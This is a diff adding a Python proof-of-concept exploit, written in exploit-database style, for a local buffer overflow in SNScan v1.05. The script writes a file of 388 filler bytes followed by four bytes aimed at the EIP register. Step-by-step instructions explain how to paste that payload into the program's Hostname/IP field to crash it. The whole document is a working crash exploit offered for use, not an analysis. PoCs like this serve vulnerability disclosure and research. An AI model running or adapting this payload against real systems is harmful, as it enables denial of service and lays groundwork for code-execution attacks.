@@ -1,0 +1,27 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Exploit Title     : SNScan v1.05 Scan Hostname/IP Field Buffer Overflow Crash PoC
+# Discovery by      : Daniel Velazquez
+# Email         : ingenierovelazquez@hotmail.com
+# Discovery Date    : 12/01/2016
+# Vendor Homepage   : http://www.foundstone.com
+# Software Link     : http://www.mcafee.com/us/downloads/free-tools/snscan.aspx
+# Tested Version    : 1.05
+# Vulnerability Type    : Denial of Service (DoS) Local
+# Tested on OS      : Windows 8 x86 es
+# Steps to Produce the Crash: 
+# 1.- Run python code : python SNScan-v1.05.py
+# 2.- Open SNScan-v1.05.txt and copy content to clipboard
+# 3.- Open SNScan.exe
+# 4.- Clic button Ok
+# 5.- Paste Clipboard Scan > Hostname/IP
+# 6.- Clic on add button (->)
+# 7.- Clic button Aceptar
+# 8.- Crashed
+ 
+buffer = "\x41" * 388
+eip = "\x42" * 4
+ 
+f = open ("SNScan-v1.05.txt", "w")
+f.write(buffer + eip)
+f.close()
